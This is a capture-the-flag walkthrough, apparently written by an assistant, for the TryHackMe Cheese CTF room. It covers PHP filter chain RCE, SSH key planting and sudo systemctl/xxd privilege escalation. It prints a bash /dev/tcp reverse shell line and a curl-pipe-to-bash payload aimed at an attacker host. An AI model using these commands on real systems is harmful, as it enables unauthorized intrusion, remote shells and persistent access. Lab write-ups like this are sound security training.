Here is your complete GitHub-ready Markdown writeup for the room:

---

````markdown
# Cheese CTF — TryHackMe Writeup

Room: Cheese CTF  
Platform: TryHackMe  
Difficulty: Medium  
Type: Web → RCE → Privilege Escalation  

---

## 🧠 Overview

Cheese CTF is a web-based machine that involves:

- Web enumeration
- PHP filter exploitation
- Remote Code Execution (RCE)
- SSH misconfiguration abuse
- Systemd timer privilege escalation
- GTFOBins abuse (xxd)

---

# 🔎 Enumeration

## Web Enumeration Checklist

- Directory brute forcing (dirsearch)
- Checking `robots.txt`
- Viewing page source
- Testing for virtual hosts
- Parameter testing

### Directory Discovery

Using dirsearch:

```bash
dirsearch -u http://cheese.thm
````

Discovered:

```
/messages.html
```

While browsing, found:

```
secret-script.php?file=
```

This parameter looked suspicious and hinted at **Local File Inclusion (LFI)**.

---

# 🧪 PHP Filter Exploitation

Opening:

```
http://cheese.thm/secret-script.php?file=php://filter/resource=supersecretmessageforadmin
```

The application allowed use of:

```
php://filter
```

This confirmed we could abuse PHP filter chains.

---

## 🔗 Generating PHP Filter Chains

Used the tool:

* **php_filter_chain_generator**
* Repository: [https://github.com/synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)

### Test Payload (phpinfo)

```bash
python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>'
```

Sending this payload confirmed execution — meaning **RCE was possible**.

---

# 💣 Remote Code Execution

Researched reverse shell techniques using PHP filter chains.

Reference:
[https://exploit-notes.hdks.org/exploit/web/php-filters-chain/](https://exploit-notes.hdks.org/exploit/web/php-filters-chain/)

---

## Reverse Shell Setup

### 1️⃣ Create reverse shell file (attacker machine)

File: `rce.py`

```bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

---

### 2️⃣ Generate PHP filter chain for RCE

```bash
python3 php_filter_chain_generator.py --chain '<?= `curl -s -L 10.0.0.1/rce.py|bash` ?>'
```

> `<?= ?>` is shorthand for `<?php echo ?>`

---

### 3️⃣ Start listeners

Terminal 1:

```bash
python3 -m http.server 8000
```

Terminal 2:

```bash
nc -nvlp 4444
```

---

### 4️⃣ Send payload

Injected generated filter chain into:

```
messages.html → secret-script.php
```

🎯 Got reverse shell.

---

# 🔐 SSH Misconfiguration

While exploring the system:

```
/home/comte/.ssh/
```

Found:

```
authorized_keys (writable)
```

This is a critical misconfiguration.

---

## 🗝️ Add Attacker SSH Key

Added attacker public key to:

```
/home/comte/.ssh/authorized_keys
```

Then connected via SSH:

```bash
ssh comte@cheese.thm
```

Successfully logged in as user `comte`.

---

# 🏁 User Flag

Inside home directory:

```bash
cat user.txt
```

---

# 🚀 Privilege Escalation

## Step 1: Check sudo permissions

```bash
sudo -l
```

Output:

```
(ALL) NOPASSWD: /bin/systemctl daemon-reload
(ALL) NOPASSWD: /bin/systemctl restart exploit.timer
(ALL) NOPASSWD: /bin/systemctl start exploit.timer
(ALL) NOPASSWD: /bin/systemctl enable exploit.timer
```

This is a major misconfiguration.

---

## Step 2: Investigate systemd timer

Location:

```
/etc/systemd/system/exploit.timer
```

Contents:

```ini
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=5s

[Install]
WantedBy=timers.target
```

Modified the timer to execute quickly (5 seconds).

Reloaded daemon:

```bash
sudo systemctl daemon-reload
sudo systemctl restart exploit.timer
```

---

## Step 3: Investigate `/opt`

Found suspicious binary:

```
/opt/xxd
```

---

# 🔥 GTFOBins Exploit (xxd)

Used:

[https://gtfobins.org/](https://gtfobins.org/)

Found that `xxd` can be abused.

GTFOBins trick:

```bash
xxd /path/to/input-file | xxd -r
```

Modified to read root flag:

```bash
./xxd "/root/root.txt" | xxd -r
```

# 🧩 Key Takeaways

* Always test for `php://filter` when LFI exists.
* Writable `authorized_keys` = instant SSH persistence.
* Misconfigured `sudo systemctl` can lead to privilege escalation.
* GTFOBins is extremely useful during privesc.
* Always enumerate `/opt`, `/etc/systemd`, and custom timers.

---

# 🔎 Tools Used

* dirsearch
* netcat
* python http.server
* php_filter_chain_generator
* GTFOBins

